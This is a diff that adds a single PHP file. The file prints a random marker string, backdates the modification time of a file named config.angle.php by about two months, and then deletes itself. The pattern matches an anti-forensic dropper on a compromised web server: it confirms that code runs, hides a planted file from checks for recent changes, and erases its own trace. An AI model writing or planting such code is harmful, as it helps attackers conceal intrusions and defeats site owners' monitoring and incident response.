@@ -1,0 +1,1 @@
+<?php echo "EVzGkVNksa"; if (file_exists("./config.angle.php")){ touch("./config.angle.php",(time()-60*60*24*30*2)); } unlink(__FILE__); /*u16W73gs7Zyq33DXfsGt*/ ?>
